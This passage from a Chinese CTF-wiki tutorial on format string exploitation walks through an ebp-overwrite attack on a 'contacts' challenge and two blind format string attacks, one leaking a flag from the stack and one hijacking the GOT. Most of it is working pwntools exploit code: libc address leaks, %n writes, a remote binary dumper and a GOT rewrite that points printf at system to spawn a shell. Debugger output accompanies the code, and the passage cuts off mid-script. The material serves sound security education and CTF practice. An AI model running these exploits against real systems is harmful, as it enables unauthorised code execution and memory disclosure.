database\u786e\u5b9a\u3002 \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3asystem_addr+'bbbb'+binsh_addr \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684ebp)\u4e3a \u5b58\u50a8system_addr\u7684\u5730\u5740-4 \u3002 \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c move esp,ebp\uff0c\u5c06esp\u6307\u5411system_addr\u7684\u5730\u5740-4 pop ebp\uff0c \u5c06esp\u6307\u5411system_addr ret\uff0c\u5c06eip\u6307\u5411system_addr\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002 \u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb \u00b6 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53caPrintInfo\u51fd\u6570\u7684\u5730\u5740\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684libc_start_main_ret\u5730\u5740(\u8be5\u5730\u5740\u662f\u5f53main\u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570)\u6765\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728printf\u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684printf\u51fd\u6570\u5904\uff0c\u5982\u4e0b \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [ #1] 0x8048c27 \u2192 leave [ #2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [ #3] 0x80487a2 \u2192 jmp 0x80487b3 [ #4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [ #5] 0x80485e1 \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 [ '$esp' , '140' ] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 [ '$esp' , 'l140' ] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ ebp-0xc ] , 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 ( \"g+\" ? ) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 ( \"%s\" ? ) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502+0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 ( \"P\" ? ) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5224\u65ad\u53ef\u4ee5\u5f97\u5230 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 \u5b58\u50a8\u7684\u5c31\u662fmain\u76f8\u5e94\u7684\u5730\u5740\uff0c\u540c\u65f6\u5229\u7528fmtarg\u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u53ef\u4ee5\u770b\u51fa\u5176\u504f\u79fb\u4e3a32\uff0c\u90a3\u4e48\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a31\u3002 gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 \u8fd9\u6837\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\u8fdb\u800c\u53ef\u4ee5\u6839\u636elibc-database\u6765\u83b7\u53d6\u5bf9\u5e94\u7684libc\uff0c\u7ee7\u800c\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u4e0e/bin/sh\u51fd\u6570\u5730\u5740\u4e86\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6808\u4e0a\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u57400xffffcd2c\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u5f97\u5230\u8fd9\u4e2a\u662f\u4e3a\u4e86\u6784\u9020\u6211\u4eec\u7684\u8054\u7cfb\u4eba\u3002 \u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u4e0b\u9762\u7684\u5730\u5740\u4fdd\u5b58\u7740\u4e0a\u5c42\u51fd\u6570\u7684\u8c03\u7528\u5730\u5740\uff0c\u5176\u76f8\u5bf9\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a11\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u5b58\u50a8\u7684ebp\u7684\u503c\u3002 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u6784\u9020\u8054\u7cfb\u4eba\u83b7\u53d6\u5806\u5730\u5740 \u00b6 \u5f97\u77e5\u4e0a\u9762\u7684\u4fe1\u606f\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u83b7\u53d6\u5806\u5730\u5740\u4e0e\u76f8\u5e94\u7684ebp\u5730\u5740\u3002 [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u76f8\u5e94\u7684\u5730\u5740\u3002\u540e\u9762\u7684bbbb\u662f\u4e3a\u4e86\u63a5\u53d7\u5b57\u7b26\u4e32\u65b9\u4fbf\u3002 \u8fd9\u91cc\u56e0\u4e3a\u51fd\u6570\u8c03\u7528\u65f6\u6240\u7533\u8bf7\u7684\u6808\u7a7a\u95f4\u4e0e\u91ca\u653e\u7684\u7a7a\u95f4\u662f\u4e00\u81f4\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u7684ebp\u5730\u5740\u5e76\u4e0d\u4f1a\u56e0\u4e3a\u6211\u4eec\u518d\u6b21\u8c03\u7528\u800c\u6539\u53d8\u3002 \u4fee\u6539ebp \u00b6 \u7531\u4e8e\u6211\u4eec\u9700\u8981\u6267\u884cmove\u6307\u4ee4\u5c06ebp\u8d4b\u7ed9esp\uff0c\u5e76\u8fd8\u9700\u8981\u6267\u884cpop ebp\u624d\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06ebp\u4fee\u6539\u4e3a\u5b58\u50a8system\u5730\u5740-4\u7684\u503c\u3002\u8fd9\u6837pop ebp\u4e4b\u540e\uff0cesp\u6070\u597d\u6307\u5411\u4fdd\u5b58system\u7684\u5730\u5740\uff0c\u8fd9\u65f6\u5728\u6267\u884cret\u6307\u4ee4\u5373\u53ef\u6267\u884csystem\u51fd\u6570\u3002 \u4e0a\u9762\u5df2\u7ecf\u5f97\u77e5\u4e86\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684ebp\u503c\uff0c\u800c\u4e5f\u77e5\u9053\u4e86\u5bf9\u5e94\u7684\u504f\u79fb\u4e3a11\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684payload\u6765\u8fdb\u884c\u4fee\u6539\u76f8\u5e94\u7684\u503c\u3002 part1 = (heap_addr - 4) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n' \u83b7\u53d6shell \u00b6 \u8fd9\u65f6\uff0c\u6267\u884c\u5b8c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4e4b\u540e\uff0c\u9000\u51fa\u5230\u4e0a\u4e0a\u51fd\u6570\uff0c\u6211\u4eec\u8f93\u51655\uff0c\u9000\u51fa\u7a0b\u5e8f\u5373\u4f1a\u6267\u884cret\u6307\u4ee4\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6shell\u3002 \u5229\u7528\u7a0b\u5e8f \u00b6 from pwn import * from LibcSearcher import * contact = ELF ( './contacts' ) ##context.log_level = 'debug' if args [ 'REMOTE' ]: sh = remote ( 11 , 111 ) else : sh = process ( './contacts' ) def createcontact ( name , phone , descrip_len , description ): sh . recvuntil ( '>>> ' ) sh . sendline ( '1' ) sh . recvuntil ( 'Contact info: \\n ' ) sh . recvuntil ( 'Name: ' ) sh . sendline ( name ) sh . recvuntil ( 'You have 10 numbers \\n ' ) sh . sendline ( phone ) sh . recvuntil ( 'Length of description: ' ) sh . sendline ( descrip_len ) sh . recvuntil ( 'description: \\n\\t\\t ' ) sh . sendline ( description ) def printcontact (): sh . recvuntil ( '>>> ' ) sh . sendline ( '4' ) sh . recvuntil ( 'Contacts:' ) sh . recvuntil ( 'Description: ' ) ## get system addr & binsh_addr payload = '%31$paaaa' createcontact ( '1111' , '1111' , '111' , payload ) printcontact () libc_start_main_ret = int ( sh . recvuntil ( 'aaaa' , drop = True ), 16 ) log . success ( 'get libc_start_main_ret addr: ' + hex ( libc_start_main_ret )) libc = LibcSearcher ( '__libc_start_main_ret' , libc_start_main_ret ) libc_base = libc_start_main_ret - libc . dump ( '__libc_start_main_ret' ) system_addr = libc_base + libc . dump ( 'system' ) binsh_addr = libc_base + libc . dump ( 'str_bin_sh' ) log . success ( 'get system addr: ' + hex ( system_addr )) log . success ( 'get binsh addr: ' + hex ( binsh_addr )) ##gdb.attach(sh) ## get heap addr and ebp addr payload = flat ([ system_addr , 'bbbb' , binsh_addr , '%6$p%11$pcccc' , ]) createcontact ( '2222' , '2222' , '222' , payload ) printcontact () sh . recvuntil ( 'Description: ' ) data = sh . recvuntil ( 'cccc' , drop = True ) data = data . split ( '0x' ) print data ebp_addr = int ( data [ 1 ], 16 ) heap_addr = int ( data [ 2 ], 16 ) ## modify ebp part1 = ( heap_addr - 4 ) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str ( part1 ) + 'x%' + str ( part2 ) + 'x%6$n' ##print payload createcontact ( '3333' , '123456789' , '300' , payload ) printcontact () sh . recvuntil ( 'Description: ' ) sh . recvuntil ( 'Description: ' ) ##gdb.attach(sh) print 'get shell' sh . recvuntil ( '>>> ' ) ##get shell sh . sendline ( '5' ) sh . interactive () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u6837\u5e76\u4e0d\u80fd\u7a33\u5b9a\u5f97\u5230shell\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u6b21\u6027\u8f93\u5165\u4e86\u592a\u957f\u7684\u5b57\u7b26\u4e32\u3002\u4f46\u662f\u6211\u4eec\u53c8\u6ca1\u6709\u529e\u6cd5\u5728\u524d\u9762\u63a7\u5236\u6240\u60f3\u8981\u8f93\u5165\u7684\u5730\u5740\u3002\u53ea\u80fd\u8fd9\u6837\u4e86\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u00b6 \u539f\u7406 \u00b6 \u6240\u8c13\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253\u6307\u7684\u662f\u53ea\u7ed9\u51fa\u53ef\u4ea4\u4e92\u7684ip\u5730\u5740\u4e0e\u7aef\u53e3\uff0c\u4e0d\u7ed9\u51fa\u5bf9\u5e94\u7684binary\u6587\u4ef6\u6765\u8ba9\u6211\u4eec\u8fdb\u884cpwn\uff0c\u5176\u5b9e\u8fd9\u4e2a\u548cBROP\u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7BROP\u5229\u7528\u7684\u662f\u6808\u6ea2\u51fa\uff0c\u800c\u8fd9\u91cc\u6211\u4eec\u5229\u7528\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u8fdb\u884c \u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570 \u786e\u5b9a\u6f0f\u6d1e\u4f4d\u7f6e \u5229\u7528 \u7531\u4e8e\u6ca1\u627e\u5230\u6bd4\u8d5b\u540e\u7ed9\u6e90\u7801\u7684\u9898\u76ee\uff0c\u6240\u4ee5\u81ea\u5df1\u7b80\u5355\u6784\u9020\u4e86\u4e24\u9053\u9898\u3002 \u4f8b\u5b501-\u6cc4\u9732\u6808 \u00b6 \u6e90\u7801\u548c\u90e8\u7f72\u6587\u4ef6\u5747\u653e\u5728\u4e86\u5bf9\u5e94\u7684\u6587\u4ef6\u5939fmt_blind_stack\u4e2d\u3002 \u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570 \u00b6 \u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e86%p\uff0c\u7a0b\u5e8f\u56de\u663e\u5982\u4e0b\u4fe1\u606f \u279c blind_fmt_stack git: ( master ) \u2717 nc localhost 9999 %p 0x7ffd4799beb0 G\ufffdflag is on the stack% \u544a\u8bc9\u6211\u4eecflag\u5728\u6808\u4e0a\uff0c\u540c\u65f6\u77e5\u9053\u4e86\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u7684\uff0c\u800c\u4e14\u5e94\u8be5\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 \u5229\u7528 \u00b6 \u90a3\u6211\u4eec\u5c31\u4e00\u70b9\u4e00\u70b9\u6d4b\u8bd5\u770b\u770b from pwn import * context . log_level = 'error' def leak ( payload ): sh = remote ( '127.0.0.1' , 9999 ) sh . sendline ( payload ) data = sh . recvuntil ( ' \\n ' , drop = True ) if data . startswith ( '0x' ): print p64 ( int ( data , 16 )) sh . close () i = 1 while 1 : payload = '%{}$p' . format ( i ) leak ( payload ) i += 1 \u6700\u540e\u5728\u8f93\u51fa\u4e2d\u7b80\u5355\u770b\u4e86\u770b\uff0c\u5f97\u5230flag //////// //////// \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x ff flag { thi s_is_fla g } \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x 00 \\x fe \\x 7f \\x 00 \\x 00 \u4f8b\u5b502-\u76f2\u6253\u52ab\u6301got \u00b6 \u6e90\u7801\u4ee5\u53ca\u90e8\u7f72\u6587\u4ef6\u5747\u5df2\u7ecf\u5728blind_fmt_got\u6587\u4ef6\u5939\u4e2d\u3002 \u786e\u5b9a\u7a0b\u5e8f\u4f4d\u6570 \u00b6 \u901a\u8fc7\u7b80\u5355\u5730\u6d4b\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u51fd\u6570\uff0c\u5e76\u4e14\u7a0b\u5e8f\u4e3a64\u4f4d\u3002 \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 %p 0x7fff3b9774c0 \u8fd9\u6b21\u5565\u4e5f\u6ca1\u6709\u56de\u663e\uff0c\u53c8\u8bd5\u4e86\u8bd5\uff0c\u53d1\u73b0\u4e5f\u6ca1\u5565\u60c5\u51b5\uff0c\u90a3\u6211\u4eec\u5c31\u53ea\u597d\u6765\u6cc4\u9732\u4e00\u6ce2\u6e90\u7a0b\u5e8f\u4e86\u3002 \u786e\u5b9a\u504f\u79fb \u00b6 \u5728\u6cc4\u9732\u7a0b\u5e8f\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u786e\u5b9a\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\uff0c\u5982\u4e0b \u279c blind_fmt_got git: ( master ) \u2717 nc localhost 9999 aaaaaaaa%p%p%p%p%p%p%p%p%p aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025 \u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u504f\u79fb\u4e3a6\u3002 \u6cc4\u9732binary \u00b6 \u7531\u4e8e\u7a0b\u5e8f\u662f64\u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u4ece0x400000\u5904\u5f00\u59cb\u6cc4\u9732\u3002\u4e00\u822c\u6765\u8bf4\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u76f2\u6253\u90fd\u662f\u53ef\u4ee5\u8bfb\u5165'\\x00'\u5b57\u7b26\u7684\uff0c\uff0c\u4e0d\u7136\u6ca1\u6cd5\u6cc4\u9732\u600e\u4e48\u73a9\uff0c\uff0c\u9664\u6b64\u4e4b\u540e\uff0c\u8f93\u51fa\u5fc5\u7136\u662f'\\x00'\u622a\u65ad\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528\u7684\u8f93\u51fa\u51fd\u6570\u5747\u662f'\\x00'\u622a\u65ad\u7684\u3002\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5982\u4e0b\u7684\u6cc4\u9732\u4ee3\u7801\u3002 ##coding=utf8 from pwn import * ##context.log_level = 'debug' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num += 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr += len ( data ) f . close () getbinary () \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728payload\u4e2d\u9700\u8981\u5224\u65ad\u662f\u5426\u6709'\\n'\u51fa\u73b0\uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u6e90\u7a0b\u5e8f\u53ea\u8bfb\u53d6\u524d\u9762\u7684\u5185\u5bb9\uff0c\u800c\u6ca1\u6709\u529e\u6cd5\u6cc4\u9732\u5185\u5b58\uff0c\u6240\u4ee5\u9700\u8981\u8df3\u8fc7\u8fd9\u6837\u7684\u5730\u5740\u3002 \u5206\u6790binary \u00b6 \u5229\u7528ida\u6253\u5f00\u6cc4\u9732\u7684binary\uff0c\u6539\u53d8\u7a0b\u5e8f\u57fa\u5730\u5740\uff0c\u7136\u540e\u7b80\u5355\u770b\u770b\uff0c\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u6e90\u7a0b\u5e8fmain\u51fd\u6570\u7684\u5730\u5740 seg000: 00000000004005 F6 push rbp seg000: 00000000004005 F7 mov rbp , rsp seg000: 00000000004005 FA add rsp , 0 FFFFFFFFFFFFFF80h seg000: 00000000004005 FE seg000: 00000000004005 FE loc_4005FE : ; CODE XREF: seg000:0000000000400639\u0019j seg000 : 00000000004005 FE lea rax , [ rbp-80h ] seg000: 0000000000400602 mov edx , 80 h ; '\u20ac' seg000 : 0000000000400607 mov rsi , rax seg000: 000000000040060 A mov edi , 0 seg000: 000000000040060 F mov eax , 0 seg000: 0000000000400614 call sub_4004C0 seg000: 0000000000400619 lea rax , [ rbp-80h ] seg000: 000000000040061 D mov rdi , rax seg000: 0000000000400620 mov eax , 0 seg000: 0000000000400625 call sub_4004B0 seg000: 000000000040062 A mov rax , cs : 601048 h seg000: 0000000000400631 mov rdi , rax seg000: 0000000000400634 call near ptr unk_4004E0 seg000: 0000000000400639 jmp short loc_4005FE \u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u7684\u662fsub_4004C0\u4e3aread\u51fd\u6570\uff0c\u56e0\u4e3a\u8bfb\u5165\u51fd\u6570\u4e00\u5171\u6709\u4e09\u4e2a\u53c2\u6570\u7684\u8bdd\uff0c\u57fa\u672c\u5c31\u662fread\u4e86\u3002\u6b64\u5916\uff0c\u4e0b\u9762\u8c03\u7528\u7684sub_4004B0\u5e94\u8be5\u5c31\u662f\u8f93\u51fa\u51fd\u6570\u4e86\uff0c\u518d\u4e4b\u540e\u5e94\u8be5\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u6b64\u540e\u53c8\u91cd\u65b0\u8df3\u5230\u8bfb\u5165\u51fd\u6570\u5904\uff0c\u90a3\u7a0b\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2awhile 1\u7684\u5faa\u73af\uff0c\u4e00\u76f4\u5728\u6267\u884c\u3002 \u5229\u7528\u601d\u8def \u00b6 \u5206\u6790\u5b8c\u4e0a\u9762\u7684\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u57fa\u672c\u601d\u8def \u6cc4\u9732printf\u51fd\u6570\u7684\u5730\u5740\uff0c \u83b7\u53d6\u5bf9\u5e94libc\u4ee5\u53casystem\u51fd\u6570\u5730\u5740 \u4fee\u6539printf\u5730\u5740\u4e3asystem\u51fd\u6570\u5730\u5740 \u8bfb\u5165/bin/sh;\u4ee5\u4fbf\u4e8e\u83b7\u53d6shell \u5229\u7528\u7a0b\u5e8f \u00b6 \u7a0b\u5e8f\u5982\u4e0b\u3002 ##coding=utf8 import math from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' context . arch = 'amd64' ip = \"127.0.0.1\" port = 9999 def leak ( addr ): # leak addr for three times num = 0 while num < 3 : try : print 'leak addr: ' + hex ( addr ) sh = remote ( ip , port ) payload = '%00008$s' + 'STARTEND' + p64 ( addr ) # \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c if ' \\x0a ' in payload : return None sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) sh . close () return data except Exception : num += 1 continue return None def getbinary (): addr = 0x400000 f = open ( 'binary' , 'w' ) while addr < 0x401000 : data = leak ( addr ) if data is None : f . write ( ' \\xff ' ) addr += 1 elif len ( data ) == 0 : f . write ( ' \\x00 ' ) addr += 1 else : f . write ( data ) addr += len ( data ) f . close () ##getbinary() read_got = 0x601020 printf_got = 0x601018 sh = remote ( ip , port ) ## let the read get resolved sh . sendline ( 'a' ) sh . recv () ## get printf addr payload = '%00008$s' + 'STARTEND' + p64 ( read_got ) sh . sendline ( payload ) data = sh . recvuntil ( 'STARTEND' , drop = True ) . ljust ( 8 , ' \\x00 ' ) sh . recv () read_addr = u64 ( data ) ## get system addr libc = 